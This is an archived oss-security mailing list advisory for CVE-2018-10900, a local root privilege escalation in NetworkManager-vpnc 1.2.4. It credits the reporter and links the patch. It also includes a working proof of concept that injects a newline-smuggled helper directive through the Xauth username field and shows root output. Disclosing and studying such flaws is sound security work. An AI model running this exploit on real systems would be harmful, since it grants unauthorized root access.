X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1543" "Friday" "20" "July" "2018" "11:38:39" "+0200" "Lubomir Rintel" "lkundrak@v3.sk" "<c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>" "52" "[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation" nil nil nil "7" "2018072009:38:39" "[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation" (number mark "U       lkundrak@v3. Jul 20   52/1543  " thread-indent "\"[oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 15505 invoked by uid 550); 20 Jul 2018 09:40:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 13557 invoked from network); 20 Jul 2018 09:38:55 -0000
X-Virus-Scanned: amavisd-new at zimbra.v3.sk
Message-ID: <c3f99b35b65fa7d78317ca62f32046eab71596b9.camel@v3.sk>
From: Lubomir Rintel <lkundrak@v3.sk>
To: oss-security@lists.openwall.com
Date: Fri, 20 Jul 2018 11:38:39 +0200
Content-Type: text/plain; charset="UTF-8"
X-Mailer: Evolution 3.28.3 (3.28.3-1.fc28) 
Mime-Version: 1.0
Content-Transfer-Encoding: 7bit
Subject: [oss-security] CVE-2018-10900: NetworkManager-vpnc-1.2.4 local privilege escalation

Hi,

NetworkManager-vpnc-1.2.6 fixes a local authenticated root bug.

The bug was responsibly disclosed to us by Denis Andzakovic. Please
credit him if you issue an advisory for a product that ships the
affected code. His original advisory should be available soon at
https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc

CVE Number: CVE-2018-10900

Original Report (will be available soon):
https://pulsesecurity.co.nz/advisories/NM-VPNC-Privesc

Patch:
https://gitlab.gnome.org/GNOME/NetworkManager-vpnc/commit/07ac18a32b4

Release Notes:
https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.news

Patched Version:
https://download.gnome.org/sources/NetworkManager-vpnc/1.2/NetworkManager-vpnc-1.2.6.tar.xz

The exploit code for QA and documentation purposes follows:

cat <<EOF >/tmp/helper
#!/bin/bash
id >/tmp/pwned
EOF
chmod +x /tmp/helper
nmcli c add con-name poc type vpn ifname '*' vpn-type vpnc \
+vpn.data "IKE DH Group = dh2" \
+vpn.data "IPSec ID = bar" \
+vpn.data "IPSec gateway = 127.0.0.1" \
+vpn.data "IPSec secret-flags = 4" \
+vpn.data "Local Port = 0" \
+vpn.data "NAT Traversal Mode = natt" \
+vpn.data "Perfect Forward Secrecy = server" \
+vpn.data "Vendor = cisco" \
+vpn.data "Xauth password-flags = 4" \
+vpn.data "Xauth username = foo$(echo; echo Password helper
/tmp/helper)" \
+vpn.data "ipsec-secret-type = save" \
+vpn.data "xauth-password-type = save"
nmcli c up poc

$ cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
context=system_u:system_r:vpnc_t:s0

Take care,
Lubo
